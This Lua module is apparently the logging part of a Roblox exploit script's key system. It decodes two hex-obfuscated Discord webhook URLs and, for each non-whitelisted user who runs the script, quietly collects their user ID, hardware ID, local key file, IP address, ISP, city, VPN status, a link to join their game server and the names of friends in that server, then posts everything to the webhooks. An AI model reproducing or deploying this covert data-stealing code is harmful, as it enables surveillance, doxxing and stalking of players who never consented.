-- =============================================================
--  ФАКТОР 2/3: ЛОГГЕР
-- =============================================================
return function(SEC_STATE)
    local _ORIG = SEC_STATE.ORIG
    local _L = SEC_STATE.PLAYER
    local _H = SEC_STATE.HTTP
    local _RAS = SEC_STATE.RAS
    local _UIS = SEC_STATE.UIS
    local _MP = game:GetService("MarketplaceService")
    local _RS = game:GetService("ReplicatedStorage")

    local function decHex(h)
        local s = ""
        for i = 1, #h, 2 do
            local n = _ORIG.tonumber(_ORIG.str_sub(h,i,i+1),16)
            if n then s = s .. _ORIG.str_char(n) end
        end
        return s
    end

    local _WH_LOG   = decHex("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
    local _WH_ALERT = decHex("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")

    local _uid = _ORIG.tostring(_L.UserId)
    local _hw = _RAS:GetClientId()
    local _tk = "N/A"
    _ORIG.pcall(function() _tk = _ORIG.readfile("nazarkus_key.json") end)

    local Config = {
        WL = {
            UIDs = {"10760143653"},
            HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
            Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
        },
        BL = { UIDs = {}, HWIDs = {}, Keys = {} }
    }
    local function chk(l)
        for _, v in _ORIG.ipairs(l.UIDs or {}) do if v == _uid then return true end end
        for _, v in _ORIG.ipairs(l.HWIDs or {}) do if v == _hw then return true end end
        for _, v in _ORIG.ipairs(l.Keys or {}) do if v == _tk then return true end end
        return false
    end
    local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")
    local spyDetected = SEC_STATE.SPY_DETECTED ~= nil
    local spyReason   = SEC_STATE.SPY_DETECTED or "None"
    SEC_STATE.STATUS  = _st
    SEC_STATE.HWID    = _hw
    SEC_STATE.KEY     = _tk

    local unc = "Unknown"
    _ORIG.pcall(function()
        local u = 0
        local funcs = {"getgenv","getrawmetatable","hookfunction","setreadonly"}
        local genv = getgenv and getgenv() or _G
        for _, f in _ORIG.ipairs(funcs) do if genv[f] then u = u + 1 end end
        local exec = "Unknown"
        pcall(function() exec = identifyexecutor() end)
        unc = exec .. " (UNC: " .. _ORIG.math_floor((u/#funcs)*100) .. "%)"
    end)

    local ni = {}
    _ORIG.pcall(function()
        local r = _ORIG.request({Url = "http://ip-api.com/json/?fields=status,country,city,isp,query,proxy,hosting", Method = "GET"})
        if r and r.Success and r.Body then ni = _H:JSONDecode(r.Body) end
    end)

    local jid = game.JobId == "" and "Unknown" or game.JobId
    local joinUrl = "N/A"
    _ORIG.pcall(function()
        local joinBase = "roblox://experiences/start?placeId=" .. _ORIG.tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
        local jBtn = "https://tinyurl.com/api-create.php?url=" .. _H:UrlEncode(joinBase)
        local res = _ORIG.request({Url = jBtn, Method = "GET"})
        if res and res.Success then joinUrl = res.Body end
    end)

    local fn, ft = "None", "None"
    _ORIG.pcall(function()
        local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
        if fdf then
            for _, f in _ORIG.ipairs(fdf:GetChildren()) do
                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
                    local bd = f:FindFirstChild("BasicFactionData")
                    if bd then fn = bd.FactionName.Value; ft = bd.FactionTag.Value end
                    break
                end
            end
        end
    end)

    local friends = {}
    _ORIG.pcall(function()
        for _, p in _ORIG.ipairs(game.Players:GetPlayers()) do
            if p ~= _L then
                local ok, isF = pcall(function() return _L:IsFriendsWith(p.UserId) end)
                if ok and isF then _ORIG.tinsert(friends, p.Name) end
            end
        end
    end)

    local placeName = "Unknown"
    _ORIG.pcall(function() placeName = _MP:GetProductInfo(game.PlaceId).Name end)

    local embeds = {}

    if spyDetected then
        _ORIG.tinsert(embeds, {
            title = "🚨 HTTP SPY DETECTED",
            color = 16711680,
            fields = {
                {name = "Reason", value = "```".._ORIG.tostring(spyReason).."```", inline = false},
                {name = "Player", value = string.format("%s (@%s)\nID: `%s`", _L.DisplayName, _L.Name, _uid), inline = false},
                {name = "Executor", value = unc, inline = true},
                {name = "System", value = (_UIS.TouchEnabled and "Mobile" or "PC"), inline = true},
                {name = "Hardware", value = string.format("HWID: `%s`\nKey: `%s`", _hw, _tk), inline = false},
                {name = "Network", value = string.format("IP: %s\nISP: %s\nVPN: %s\nLoc: %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.proxy and "Yes" or "No", ni.country or "N/A", ni.city or "N/A"), inline = false},
                {name = "Links", value = string.format("[Join](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), inline = false}
            }
        })
        _ORIG.pcall(function()
            _ORIG.request({
                Url = _WH_ALERT, Method = "POST",
                Headers = {["Content-Type"]="application/json"},
                Body = _H:JSONEncode({embeds=embeds})
            })
        end)
        return
    end

    if _st == "whitelist" then
        _ORIG.tinsert(embeds, {
            title = "✅ WL User Executed",
            color = 65280,
            fields = {
                {name = "**Player Info**", value = string.format("Name: %s (@%s)\nUser ID: `%s`", _L.DisplayName, _L.Name, _uid), inline = false},
                {name = "**Executor**", value = unc, inline = false},
                {name = "**System**", value = "Platform: " .. (_UIS.TouchEnabled and "Mobile" or "PC"), inline = false},
                {name = "**Hardware Info**", value = string.format("HWID: `%s`\nKey: `%s`", _hw, _tk), inline = false}
            }
        })
    else
        _ORIG.tinsert(embeds, {
            title = _st == "blacklist" and "⛔ BL Attempt" or "⚠️ Guest Execute",
            color = _st == "blacklist" and 0 or 16753920,
            fields = {
                {name = "Player", value = string.format("%s (@%s)\nID: `%s`\nAge: %d", _L.DisplayName, _L.Name, _uid, _L.AccountAge), inline = false},
                {name = "Executor", value = unc, inline = true},
                {name = "System", value = (_UIS.TouchEnabled and "Mobile" or "PC"), inline = true},
                {name = "Hardware", value = string.format("HWID: `%s`\nKey: `%s`", _hw, _tk), inline = false},
                {name = "Network", value = string.format("IP: %s\nISP: %s\nVPN: %s\nLoc: %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.proxy and "Yes" or "No", ni.country or "N/A", ni.city or "N/A"), inline = false},
                {name = "Friends", value = "```" .. (#friends > 0 and _ORIG.tconcat(friends, ", ") or "None") .. "```", inline = false},
                {name = "Links", value = string.format("[Join](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), inline = false}
            }
        })
    end

    _ORIG.pcall(function()
        _ORIG.request({
            Url = _WH_LOG, Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = _H:JSONEncode({embeds=embeds})
        })
    end)
end
